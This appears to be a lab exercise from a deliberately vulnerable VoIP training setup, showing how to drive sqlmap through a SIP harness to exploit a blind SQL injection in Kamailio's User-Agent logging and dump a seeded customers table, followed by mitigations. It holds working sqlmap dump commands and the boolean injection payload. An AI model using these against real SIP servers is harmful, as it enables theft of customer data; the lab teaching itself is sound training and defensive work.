# Exercise 8: Automated SIP → MySQL Data Exfiltration with sqlmap

## Goal

Use the `sip-sqlmap-harness` tool to drive `sqlmap` against the intentionally vulnerable Kamailio `User-Agent` SQL injection path, and dump the seeded `customers` table without writing any SQL by hand.

## Prerequisites

- DVRTC running: `./scripts/compose.sh --scenario pbx1 up -d`
- The `testing` service, which ships `sqlmap` and `sip-sqlmap-harness`

## Steps

### Step 1: Open an interactive testing shell

Run on the host:

```bash
./scripts/compose.sh --scenario pbx1 run --rm testing sh
```

### Step 2: Start the SIP SQLi harness

In the testing shell, run the harness in the background:

```bash
sip-sqlmap-harness --mode pbx1 --host 127.0.0.1 --listen-port 17771 &
```

The harness bridges `sqlmap` (which speaks HTTP) to the Kamailio SIP injection point. It listens on `http://127.0.0.1:17771/`, accepts a query-string parameter from `sqlmap`, embeds it in a crafted SIP `REGISTER` `User-Agent` header, sends that to Kamailio, and returns `TRUE` or `FALSE` depending on the SIP response code.

### Step 3: Dump the seeded customers table

In the testing shell:

```bash
sqlmap -u "http://127.0.0.1:17771/?q=1" -p q \
  --string=TRUE --batch \
  --dbms=MySQL --technique=B \
  -D useragents -T customers --dump
```

Flag summary:

| Flag | Purpose |
|------|---------|
| `-u` | URL of the harness oracle |
| `-p q` | inject through the `q` parameter |
| `--string=TRUE` | treat HTTP responses containing `TRUE` as boolean-true |
| `--batch` | accept all defaults without prompting |
| `--dbms=MySQL` | skip DB fingerprinting |
| `--technique=B` | use blind boolean-based inference only |
| `-D useragents -T customers --dump` | target the `customers` table in the `useragents` database |

`sqlmap` extracts the full table content row by row. The output includes the fake credit card numbers, SSNs, and addresses seeded into `useragents.customers`.

### Step 4: Stop the harness

```bash
kill %1
exit
```

## What's happening

Kamailio logs incoming `User-Agent` headers by concatenating them directly into a raw SQL `INSERT` — no escaping, no parameterized query. The harness exploits this by crafting a `User-Agent` value that turns each boolean check from `sqlmap` into a payload of the form:

```sql
INSERT INTO useragents (useragent) VALUES
  ('seed'),
  ((SELECT IF((<expression>), 'ok', (SELECT 1 UNION SELECT 2)))),
  ('tail');
```

When `<expression>` is TRUE, the scalar subquery returns `'ok'`, the insert succeeds, and Kamailio replies `401 Unauthorized` (normal auth challenge). When it is FALSE, `(SELECT 1 UNION SELECT 2)` returns two rows in a scalar context, which triggers a MySQL cardinality error. The insert fails and Kamailio replies `500`. The harness maps `401` → `TRUE` and `500` → `FALSE` in the HTTP response body, which is exactly what `sqlmap --string=TRUE` looks for.

## Mitigation

- Apply the Kamailio `{s.escape.common}` transformation to any pseudo-variable before embedding it in a raw SQL string. For example, the vulnerable `insert into useragents (useragent) values ('$ua')` becomes `insert into useragents (useragent) values ('$(ua{s.escape.common})')`. This escapes `'`, `"`, `\`, and null bytes. Kamailio also provides `{sql.val.str}`, which both quotes and escapes the value in one step.
- Validate or normalize `User-Agent` before logging
- Treat every caller-controlled SIP header as untrusted input
